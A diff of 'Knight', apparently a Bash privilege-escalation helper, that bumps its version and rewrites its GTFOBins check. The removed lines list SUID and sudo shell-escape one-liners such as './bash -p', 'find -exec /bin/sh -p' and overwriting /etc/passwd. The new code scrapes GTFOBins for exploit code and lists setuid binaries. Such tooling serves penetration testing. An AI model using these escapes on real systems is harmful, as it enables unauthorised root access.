@@ -59,13 +59,13 @@ function tty_shell() {
 # Function to display Knight version
 function show_version() {
     # Display Knight version
-    echo -e "\nKnight-v(${BPurple}4.4.8${NC})\n"
+    echo -e "\nKnight-v(${BPurple}4.5.8${NC})\n"
 }
 
 # Function to display Knight help message
 function show_help() {
     # Display Knight help message
-    echo -e "\nKnight-v(${BPurple}4.4.8${NC})\n"
+    echo -e "\nKnight-v(${BPurple}4.5.8${NC})\n"
     echo -e "${BPurple}Usage:${NC}"
     echo -e "	./knight                 {Runs the script in ${BPurple}standard${NC} mode}"
     echo -e "	./knight ${BPurple}--version${NC} or ${BPurple}-v${NC} {Displays the Program ${BPurple}version${NC} and exits}"
@@ -190,84 +190,109 @@ function dker() {
 }
 
 # Function to find and analyze SUID binaries using GTFObins techniques
-function check_gtfobins() {
-    echo -e "\n[${BPurple}+${NC}] ${BBlue}Checking for${NC} ${BPurple}GTFObins exploitable binaries${NC}"
-    
-    # Dictionary of known GTFObins binaries and their techniques
-    declare -A gtfo_techniques=(
-        ["cp"]="SUID: cp file /etc/passwd"
-        ["bash"]="SUID: ./bash -p"
-        ["vim"]="SUID: vim -c ':!/bin/sh'"
-        ["nano"]="SUID: nano test.txt\n^R^X\nreset; sh 1>&0 2>&0"
-        ["find"]="SUID: find . -exec /bin/sh -p \; -quit"
-        ["nmap"]="SUID: nmap --interactive\nnmap> !sh"
-        ["more"]="SUID: more /etc/profile\n!/bin/sh"
-        ["less"]="SUID: less /etc/profile\n!/bin/sh"
-        ["awk"]="SUID: awk 'BEGIN {system(\"/bin/sh\")}'"
-        ["python"]="SUID: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
-        ["perl"]="SUID: perl -e 'exec \"/bin/sh\";'"
-        ["ruby"]="SUID: ruby -e 'exec \"/bin/sh\"'"
-        ["mv"]="SUID: mv file /etc/passwd"
-        ["chmod"]="SUID: chmod 6777 /etc/passwd"
-        ["chown"]="SUID: chown root:root file"
-        ["tar"]="SUID: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
-        ["zip"]="SUID: zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/sh\""
-        ["mount"]="SUID: mount -o bind /bin/sh /bin/mount\n./mount"
-        ["sudo"]="SUDO: sudo /bin/sh"
-    )
+check_gtfobins() {
+    # Print Ascii Art
+    echo -e "${BRed} _____ _____ _____ _____ _____ _         "${NC} 
+    echo -e "${BRed}|   __|_   _|   __|     | __  |_|___ ___ "${NC}
+    echo -e "${BRed}|  |  | | | |   __|  |  | __ -| |   |_ -|"${NC}
+    echo -e "${BRed}|_____| |_| |__|  |_____|_____|_|_|_|___|"${NC}
 
-    # Find all SUID binaries
-    echo -e "\n[${BPurple}+${NC}] ${BBlue}Searching for SUID binaries...${NC}"
-    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
+    # Prompt the user to choose between scraping GTFOBins or searching for setuid binaries
+    echo -e "\n${BGray}Choose an option:${NC}\n"
+    echo -e "${BGray}1. Scrape GTFOBins for a specific binary${NC}"
+    echo -e "${BGray}2. Search for setuid binaries on the system${NC}"
+    printf "\n${BGray}Enter your choice (1 or 2): ${NC}"
+    read option
 
-    # Check each found binary against our GTFObins database
-    echo -e "\n[${BPurple}+${NC}] ${BBlue}Analyzing found binaries...${NC}\n"
-    
-    EXPLOITABLE_COUNT=0
-    
-    while IFS= read -r binary; do
-        binary_name=$(basename "$binary")
-        if [[ ${gtfo_techniques[$binary_name]+_} ]]; then
-            EXPLOITABLE_COUNT=$((EXPLOITABLE_COUNT + 1))
-            echo -e "${BGreen}[!] Found exploitable binary:${NC} $binary"
-            echo -e "${BBlue}[>] GTFObins technique:${NC}\n${gtfo_techniques[$binary_name]}\n"
-            
-            # Check if binary is actually executable by current user
-            if [ -x "$binary" ]; then
-                echo -e "${BGreen}[+] Binary is executable by current user${NC}"
+    if [ "$option" == "1" ]; then
+        # Ask the user for the binary name
+        printf "\n${BPurple}Enter the binary name: ${NC}"
+        read binary
+
+        # Check if a binary name is provided and if it contains only alphanumeric characters, underscores, and hyphens
+        if [ -z "$binary" ] || [[ ! "$binary" =~ ^[a-zA-Z0-9_-]+$ ]]; then
+            echo -e "${BRed}Please provide a valid binary name with only alphanumeric characters, underscores, and hyphens.${NC}"
+            return 1
+        fi
+
+        local url="https://gtfobins.github.io/gtfobins/$binary/"
+
+        # Query gtfobins.github.io for the binary
+        local response=$(curl -s "$url")
+
+        # Extract the list of functions and display
+        local functions=$(echo "$response" | pup 'h2.function-name text{}' | sed 's/^\s*//;s/\s*$//' | sed '/^$/d')  # Remove leading/trailing spaces and empty lines
+
+        # Check if there are any functions available
+        if [ -z "$functions" ]; then
+            echo -e "${BRed}[x]'$binary' not found in gtfobins database.${NC}"
+            return 1
+        fi
+
+        local i=1
+        echo ""
+        while IFS= read -r func; do
+            echo -e "${BGray}$i. $func${NC}"
+            ((i++))
+        done <<< "$functions"
+
+        # Prompt for function selection
+        printf "\n${BPurple}Choose a function (enter the number): ${NC}"
+        read choice
+
+        # Validate the choice
+        if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -ge "$i" ]; then
+            echo -e "${BRed}Invalid choice. Please enter a valid number.${NC}"
+            return 1
+        fi
+
+        # Retrieve the exploit code for the chosen function
+        local chosen_func=$(echo "$functions" | sed -n "${choice}p" | tr '[:upper:]' '[:lower:]' | sed 's/ /-/g')
+        local exploit=$(echo "$response" | awk -v chosen_func="$chosen_func" '/<h2 id="'$chosen_func'"/,/<\/pre>/ {gsub(/<\/?[^>]+>/, ""); gsub(/&lt;/, "<"); gsub(/&gt;/, ">"); gsub(/&amp;/, "\\x26"); gsub(/&quot;/, "\""); gsub(/&#39;/, "\x27"); sub(/^[[:space:]]+/, ""); if ($0 ~ /\S/) print $0;}')
+
+        # Check if exploit code is empty
+        if [ -z "$exploit" ]; then
+            echo -e "${BRed}No exploit code found.${NC}"
+            return 1
+        fi
+
+        # Split the exploit content into description and code
+        IFS=$'\n' read -d '' -r -a lines <<< "$exploit"
+        description=""
+        code=""
+        start_code=0
+        for line in "${lines[@]}"; do
+            if [[ "$line" =~ ^(export|TF=|echo|nmap|local) ]] || [[ "$line" =~ ^[[:space:]]*[a-zA-Z0-9_]+= ]]; then
+                if [[ $start_code -eq 0 ]]; then
+                    echo -e "\nDescription:\n------------------------"
+                    echo -e "${BGray}${description}${NC}"
+                    description=""
+                    echo -e "\nExploit Code:\n------------------------"
+                fi
+                echo -e "${BPurple}${line}${NC}"
+                start_code=1
             else
-                echo -e "${BRed}[-] Binary is not executable by current user${NC}"
+                if [[ $start_code -eq 0 ]]; then
+                    description+="$line\n"
+                else
+                    echo -e "${BGray}${line}${NC}"
+                fi
             fi
-            
-            # Check version of the binary if possible
-            if [ -x "$binary" ]; then
-                version=$($binary --version 2>/dev/null | head -n1 || echo "Version not available")
-                echo -e "${BBlue}[>] Version:${NC} $version\n"
-            fi
-            
-            echo -e "${BPurple}[>] Full path:${NC} $binary"
-            echo -e "${BPurple}[>] Permissions:${NC} $(ls -l "$binary")\n"
-            echo -e "-------------------------------------------"
-        fi
-    done <<< "$SUID_BINS"
-    
-    if [ $EXPLOITABLE_COUNT -eq 0 ]; then
-        echo -e "${BRed}[-] No known GTFObins exploitable binaries found${NC}\n"
-    else
-        echo -e "\n${BGreen}[+] Found $EXPLOITABLE_COUNT potentially exploitable binaries!${NC}"
-        echo -e "${BBlue}[>] You can visit https://gtfobins.github.io/ for more detailed exploitation techniques${NC}\n"
-    fi
+        done
 
-    # Additional check for sudo rights
-    if command -v sudo >/dev/null 2>&1; then
-        echo -e "\n[${BPurple}+${NC}] ${BBlue}Checking sudo permissions...${NC}"
-        sudo_output=$(sudo -l 2>/dev/null)
-        if [ $? -eq 0 ]; then
-            echo -e "${BGreen}[!] Sudo rights found:${NC}\n$sudo_output"
-            echo -e "\n${BBlue}[>] Check these binaries on GTFObins for sudo exploitation techniques${NC}"
-        else
-            echo -e "${BRed}[-] No sudo rights found or sudo password required${NC}"
-        fi
+    elif [ "$option" == "2" ]; then
+        # Search for setuid binaries on the system
+        echo -e "\n${BGray}Searching for setuid binaries on the system...${NC}"
+        # Print headers with fixed widths
+        printf "\n${BPurple}%-12s %-5s %-8s %-8s %-10s %-14s %s${NC}\n" "Permissions" "Links" "Owner" "Group" "Size" "Date" "Path"
+        # Process each line with fixed widths
+        find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null | awk '{ 
+            printf "%-12s %-5s %-8s %-8s %-10s %-14s %s\n", 
+            $1, $2, $3, $4, $5, $6 " " $7 " " $8, $9 
+        }'
+    else
+        echo -e "${BRed}Invalid option. Please choose either 1 or 2.${NC}"
+        return 1
     fi
 }
 
@@ -363,7 +388,7 @@ function check_writable_dirs() {
 function exit_program() {
     # Exit the program
     echo ""
-    echo -e "\n[${BPurple}+${NC}] Exiting Knight-v(${BPurple}4.4.8${NC}) at $(date +%T)\n"
+    echo -e "\n[${BPurple}+${NC}] Exiting Knight-v(${BPurple}4.5.8${NC}) at $(date +%T)\n"
     exit 0
 }
 
@@ -903,7 +928,7 @@ then
     echo -e "\e[3m${BBlue}May the strength of sudoers be with you${NC}\e[0m"
 
 else
-    echo -e "\n[${BPurple}+${NC}] Knight-v(${BPurple}4.4.8${NC}) ${BPurple}initialzing${NC} on ${BPurple}$(uname -a | awk '{print $2}')${NC} at $(date +%T)\n"
+    echo -e "\n[${BPurple}+${NC}] Knight-v(${BPurple}4.5.8${NC}) ${BPurple}initialzing${NC} on ${BPurple}$(uname -a | awk '{print $2}')${NC} at $(date +%T)\n"
     # Initialize Knight
     main
 fi
